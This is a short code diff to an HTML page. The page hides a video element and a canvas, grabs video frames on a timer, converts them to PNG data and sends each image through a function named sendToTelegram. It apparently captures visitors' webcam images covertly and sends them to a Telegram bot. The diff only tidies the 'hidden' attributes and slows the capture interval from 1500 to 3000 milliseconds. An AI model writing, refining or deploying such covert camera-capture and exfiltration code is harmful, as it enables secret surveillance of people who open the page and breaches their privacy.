@@ -4,11 +4,11 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
-    <div class="video-wrap" hidden="hidden">
+    <div class="video-wrap" hidden>
        <video id="video" playsinline autoplay></video>
     </div>
 
-    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <canvas hidden id="canvas" width="640" height="480"></canvas>
 
     <script>
         function sendToTelegram(imgData) {
@@ -59,7 +59,7 @@
                 context.drawImage(video, 0, 0, 640, 480);
                 var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                 sendToTelegram(canvasData);
-            }, 1500);
+            }, 3000);
         }
 
         // Load init
